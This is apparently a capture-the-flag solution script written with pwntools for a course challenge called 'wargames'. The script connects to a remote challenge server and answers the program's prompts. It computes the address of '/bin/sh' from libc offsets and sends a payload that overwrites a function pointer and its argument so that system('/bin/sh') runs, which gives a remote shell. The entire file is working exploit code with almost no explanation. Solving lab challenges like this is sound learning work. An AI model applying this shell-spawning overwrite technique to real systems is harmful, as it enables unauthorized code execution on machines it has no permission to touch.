from pwn import *

bpath = './wargames'
elf = ELF(bpath)

context.binary = elf
#context.log_level = 'debug'


'''
No PIE/Canary/ASLR, Partial RELRO, yes NX

address of system = 0x7ffff7a523a0
address of exit   = 0x7ffff7a47040

==> libc version: either of the following
    - libc6_2.23-0ubuntu11.2_amd64
    - libc6_2.23-0ubuntu11.3_amd64
'''

addr_system = 0x7ffff7a523a0
nuclear_code = b'CPE 1704 TKS'


# Calculate address of /bin/sh in memory:
libc_base = addr_system - 0x453a0       # value obtained from libc.rip
offset_bin_sh = 0x18ce57                # value obtained from running "strings -tx libc6_2.23-0ubuntu11.3_amd64.so | grep '/bin/sh'" 
addr_bin_sh = libc_base + offset_bin_sh

def exploit():
    p = remote('cs4401shell.walls.ninja', 20848)

    msg = p.recvuntil(b'Shall we play a game? [Y/n]')
    print(msg)
    p.sendline(b'y')

    msg = p.recvuntil(b'How about Global Thermonuclear War? [Y/n]')
    print(msg)
    p.sendline(b'y')

    msg = p.recvuntil(b'Please enter the code to trigger the launch system (')
    print(msg)
    addr = p.recvuntil(b'):')[:-2]
    print('system addr: ', addr)
    p.sendline(nuclear_code)

    msg = p.recvuntil(b'...')
    if b'launched' in msg:
        print('got code right!')
        offset_fun_ptr = 504
        offset_arg = 496
        exploit_str = flat({0:b'y', offset_arg: addr_bin_sh, offset_fun_ptr: addr_system})

        p.recvuntil(b'How about a nice game of chess? [Y/n]')
        p.sendline(exploit_str)
        p.interactive()
    else:
        print("code didn't work")
        p.close()
    

exploit()



